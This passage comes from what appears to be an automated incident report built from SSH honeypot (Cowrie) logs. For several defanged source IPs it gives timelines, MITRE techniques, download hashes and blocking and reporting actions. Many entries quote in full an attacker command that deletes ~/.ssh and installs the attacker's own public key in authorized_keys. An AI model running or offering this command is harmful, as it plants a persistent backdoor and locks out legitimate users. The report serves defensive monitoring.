| `2026-04-13 15:31:52` | `cowrie.login.success` |
| `2026-04-13 15:31:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0607461f4ceb

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-13 15:36 |
| **Last Seen** | 2026-04-13 15:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:36:09` | `cowrie.session.connect` |
| `2026-04-13 15:36:09` | `cowrie.client.version` |
| `2026-04-13 15:36:09` | `cowrie.client.kex` |
| `2026-04-13 15:36:10` | `cowrie.login.success` |
| `2026-04-13 15:36:10` | `cowrie.session.params` |
| `2026-04-13 15:36:10` | `cowrie.command.input` |
| `2026-04-13 15:36:10` | `cowrie.command.failed` |
| `2026-04-13 15:36:10` | `cowrie.log.closed` |
| `2026-04-13 15:36:10` | `cowrie.session.params` |
| `2026-04-13 15:36:10` | `cowrie.command.input` |
| `2026-04-13 15:36:11` | `cowrie.session.file_download` |
| `2026-04-13 15:36:11` | `cowrie.log.closed` |
| `2026-04-13 15:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a190514682cc

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-13 15:36 |
| **Last Seen** | 2026-04-13 15:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:36:13` | `cowrie.session.connect` |
| `2026-04-13 15:36:13` | `cowrie.client.version` |
| `2026-04-13 15:36:13` | `cowrie.client.kex` |
| `2026-04-13 15:36:13` | `cowrie.login.success` |
| `2026-04-13 15:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba3f35a3fe61

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-13 15:37 |
| **Last Seen** | 2026-04-13 15:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:37:28` | `cowrie.session.connect` |
| `2026-04-13 15:37:28` | `cowrie.client.version` |
| `2026-04-13 15:37:28` | `cowrie.client.kex` |
| `2026-04-13 15:37:29` | `cowrie.login.success` |
| `2026-04-13 15:37:29` | `cowrie.session.params` |
| `2026-04-13 15:37:29` | `cowrie.command.input` |
| `2026-04-13 15:37:29` | `cowrie.command.failed` |
| `2026-04-13 15:37:29` | `cowrie.log.closed` |
| `2026-04-13 15:37:30` | `cowrie.session.params` |
| `2026-04-13 15:37:30` | `cowrie.command.input` |
| `2026-04-13 15:37:30` | `cowrie.session.file_download` |
| `2026-04-13 15:37:30` | `cowrie.log.closed` |
| `2026-04-13 15:37:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5c5d92353f8

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-13 15:37 |
| **Last Seen** | 2026-04-13 15:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:37:32` | `cowrie.session.connect` |
| `2026-04-13 15:37:32` | `cowrie.client.version` |
| `2026-04-13 15:37:32` | `cowrie.client.kex` |
| `2026-04-13 15:37:32` | `cowrie.login.success` |
| `2026-04-13 15:37:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba6f9eaad378

| Field | Detail |
|---|---|
| **Source IP** | `87.106.46[.]37` |
| **First Seen** | 2026-04-13 15:44 |
| **Last Seen** | 2026-04-13 15:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:44:14` | `cowrie.session.connect` |
| `2026-04-13 15:44:14` | `cowrie.client.version` |
| `2026-04-13 15:44:14` | `cowrie.client.kex` |
| `2026-04-13 15:44:15` | `cowrie.login.success` |
| `2026-04-13 15:44:15` | `cowrie.session.params` |
| `2026-04-13 15:44:15` | `cowrie.command.input` |
| `2026-04-13 15:44:15` | `cowrie.command.failed` |
| `2026-04-13 15:44:15` | `cowrie.log.closed` |
| `2026-04-13 15:44:16` | `cowrie.session.params` |
| `2026-04-13 15:44:16` | `cowrie.command.input` |
| `2026-04-13 15:44:16` | `cowrie.session.file_download` |
| `2026-04-13 15:44:16` | `cowrie.log.closed` |
| `2026-04-13 15:44:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.46[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.106.46[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0322478ac925

| Field | Detail |
|---|---|
| **Source IP** | `87.106.46[.]37` |
| **First Seen** | 2026-04-13 15:44 |
| **Last Seen** | 2026-04-13 15:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:44:18` | `cowrie.session.connect` |
| `2026-04-13 15:44:18` | `cowrie.client.version` |
| `2026-04-13 15:44:18` | `cowrie.client.kex` |
| `2026-04-13 15:44:19` | `cowrie.login.success` |
| `2026-04-13 15:44:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.46[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.106.46[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbe5ac732f03

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 15:44 |
| **Last Seen** | 2026-04-13 15:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:44:50` | `cowrie.session.connect` |
| `2026-04-13 15:44:50` | `cowrie.client.version` |
| `2026-04-13 15:44:50` | `cowrie.client.kex` |
| `2026-04-13 15:44:51` | `cowrie.login.success` |
| `2026-04-13 15:44:51` | `cowrie.session.params` |
| `2026-04-13 15:44:51` | `cowrie.command.input` |
| `2026-04-13 15:44:51` | `cowrie.command.failed` |
| `2026-04-13 15:44:51` | `cowrie.log.closed` |
| `2026-04-13 15:44:52` | `cowrie.session.params` |
| `2026-04-13 15:44:52` | `cowrie.command.input` |
| `2026-04-13 15:44:52` | `cowrie.session.file_download` |
| `2026-04-13 15:44:52` | `cowrie.log.closed` |
| `2026-04-13 15:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1b99e94012e

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 15:44 |
| **Last Seen** | 2026-04-13 15:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:44:54` | `cowrie.session.connect` |
| `2026-04-13 15:44:54` | `cowrie.client.version` |
| `2026-04-13 15:44:54` | `cowrie.client.kex` |
| `2026-04-13 15:44:55` | `cowrie.login.success` |
| `2026-04-13 15:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ac765d33e83

| Field | Detail |
|---|---|
| **Source IP** | `87.106.46[.]37` |
| **First Seen** | 2026-04-13 15:45 |
| **Last Seen** | 2026-04-13 15:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:45:51` | `cowrie.session.connect` |
| `2026-04-13 15:45:51` | `cowrie.client.version` |
| `2026-04-13 15:45:51` | `cowrie.client.kex` |
| `2026-04-13 15:45:51` | `cowrie.login.success` |
| `2026-04-13 15:45:52` | `cowrie.session.params` |
| `2026-04-13 15:45:52` | `cowrie.command.input` |
| `2026-04-13 15:45:52` | `cowrie.command.failed` |
| `2026-04-13 15:45:52` | `cowrie.log.closed` |
| `2026-04-13 15:45:52` | `cowrie.session.params` |
| `2026-04-13 15:45:52` | `cowrie.command.input` |
| `2026-04-13 15:45:52` | `cowrie.session.file_download` |
| `2026-04-13 15:45:52` | `cowrie.log.closed` |
| `2026-04-13 15:45:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.46[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.106.46[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-587ebb9aeea6

| Field | Detail |
|---|---|
| **Source IP** | `87.106.46[.]37` |
| **First Seen** | 2026-04-13 15:45 |
| **Last Seen** | 2026-04-13 15:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:45:54` | `cowrie.session.connect` |
| `2026-04-13 15:45:54` | `cowrie.client.version` |
| `2026-04-13 15:45:54` | `cowrie.client.kex` |
| `2026-04-13 15:45:55` | `cowrie.login.success` |
| `2026-04-13 15:45:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.46[.]37` to AbuseIPDB if not already reported
- [ ] Block `87.106.46[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afa2fd0846f6

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 15:46 |
| **Last Seen** | 2026-04-13 15:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:46:28` | `cowrie.session.connect` |
| `2026-04-13 15:46:28` | `cowrie.client.version` |
| `2026-04-13 15:46:28` | `cowrie.client.kex` |
| `2026-04-13 15:46:29` | `cowrie.login.success` |
| `2026-04-13 15:46:29` | `cowrie.session.params` |
| `2026-04-13 15:46:29` | `cowrie.command.input` |
| `2026-04-13 15:46:29` | `cowrie.command.failed` |
| `2026-04-13 15:46:29` | `cowrie.log.closed` |
| `2026-04-13 15:46:30` | `cowrie.session.params` |
| `2026-04-13 15:46:30` | `cowrie.command.input` |
| `2026-04-13 15:46:30` | `cowrie.session.file_download` |
| `2026-04-13 15:46:30` | `cowrie.log.closed` |
| `2026-04-13 15:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-229301de2e32

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 15:46 |
| **Last Seen** | 2026-04-13 15:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:46:32` | `cowrie.session.connect` |
| `2026-04-13 15:46:32` | `cowrie.client.version` |
| `2026-04-13 15:46:32` | `cowrie.client.kex` |
| `2026-04-13 15:46:33` | `cowrie.login.success` |
| `2026-04-13 15:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.143.141[.]37` to AbuseIPDB if not already reported
- [ ] Block `94.143.141[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9e89233f37e

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-04-13 15:47 |
| **Last Seen** | 2026-04-13 15:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:47:09` | `cowrie.session.connect` |
| `2026-04-13 15:47:09` | `cowrie.client.version` |
| `2026-04-13 15:47:09` | `cowrie.client.kex` |
| `2026-04-13 15:47:09` | `cowrie.login.success` |
| `2026-04-13 15:47:10` | `cowrie.session.params` |
| `2026-04-13 15:47:10` | `cowrie.command.input` |
| `2026-04-13 15:47:10` | `cowrie.command.failed` |
| `2026-04-13 15:47:10` | `cowrie.log.closed` |
| `2026-04-13 15:47:10` | `cowrie.session.params` |
| `2026-04-13 15:47:10` | `cowrie.command.input` |
| `2026-04-13 15:47:10` | `cowrie.session.file_download` |
| `2026-04-13 15:47:10` | `cowrie.log.closed` |
| `2026-04-13 15:47:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e11a2a580d4d

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-04-13 15:47 |
| **Last Seen** | 2026-04-13 15:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:47:12` | `cowrie.session.connect` |
| `2026-04-13 15:47:12` | `cowrie.client.version` |
| `2026-04-13 15:47:12` | `cowrie.client.kex` |
| `2026-04-13 15:47:12` | `cowrie.login.success` |
| `2026-04-13 15:47:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7cac55fa6e6

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-04-13 15:49 |
| **Last Seen** | 2026-04-13 15:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:49:05` | `cowrie.session.connect` |
| `2026-04-13 15:49:05` | `cowrie.client.version` |
| `2026-04-13 15:49:05` | `cowrie.client.kex` |
| `2026-04-13 15:49:06` | `cowrie.login.success` |
| `2026-04-13 15:49:06` | `cowrie.session.params` |
| `2026-04-13 15:49:06` | `cowrie.command.input` |
| `2026-04-13 15:49:06` | `cowrie.command.failed` |
| `2026-04-13 15:49:06` | `cowrie.log.closed` |
| `2026-04-13 15:49:06` | `cowrie.session.params` |
| `2026-04-13 15:49:06` | `cowrie.command.input` |
| `2026-04-13 15:49:07` | `cowrie.session.file_download` |
| `2026-04-13 15:49:07` | `cowrie.log.closed` |
| `2026-04-13 15:49:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-544ff8235e5b

| Field | Detail |
|---|---|
| **Source IP** | `183.91.11[.]36` |
| **First Seen** | 2026-04-13 15:49 |
| **Last Seen** | 2026-04-13 15:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:49:08` | `cowrie.session.connect` |
| `2026-04-13 15:49:08` | `cowrie.client.version` |
| `2026-04-13 15:49:08` | `cowrie.client.kex` |
| `2026-04-13 15:49:09` | `cowrie.login.success` |
| `2026-04-13 15:49:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.11[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.11[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8ac87a5c052

| Field | Detail |
|---|---|
| **Source IP** | `94.143.141[.]37` |
| **First Seen** | 2026-04-13 15:49 |
| **Last Seen** | 2026-04-13 15:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
